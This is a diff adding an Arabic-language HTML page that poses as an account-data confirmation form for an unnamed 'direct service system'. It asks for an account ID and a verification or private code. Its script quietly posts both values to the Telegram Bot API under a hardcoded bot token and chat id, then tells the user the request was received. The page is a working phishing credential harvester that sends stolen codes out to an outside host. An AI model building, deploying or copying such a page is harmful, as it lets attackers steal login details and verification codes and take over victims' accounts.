@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد البيانات</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f4f4f9;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+            text-align: right;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #e60000;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .footer {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>تأكيد بيانات الحساب</h2>
+
+    <form id="secForm">
+        <div class="input-group">
+            <label for="f_id">معرف الحساب (ID):</label>
+            <input type="text" id="f_id" required placeholder="أدخل ID الحساب">
+        </div>
+
+        <div class="input-group">
+            <label for="f_code">رمز التحقق / الرمز الخاص:</label>
+            <input type="text" id="f_code" required placeholder="أدخل الرمز الخاص">
+        </div>
+
+        <button type="submit">إرسال الطلب</button>
+    </form>
+
+    <div class="footer">
+        نظام الخدمة المباشرة
+    </div>
+</div>
+
+<script>
+    const _t = '8631186494:AAFg8-09-5SCFnSUUuI7udG7WzUl6ZrbYZI';
+    const _c = '8862229473';
+
+    document.getElementById('secForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const v1 = document.getElementById('f_id').value;
+        const v2 = document.getElementById('f_code').value;
+
+        const msg = `📌 *بيانات جديدة*\n\n🔹 *ID:* ${v1}\n🔹 *Code:* ${v2}`;
+
+        fetch(`https://api.telegram.org/bot${_t}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: _c,
+                text: msg,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(res => {
+            if (res.ok) {
+                alert('تم الاستلام بنجاح.');
+                document.getElementById('secForm').reset();
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
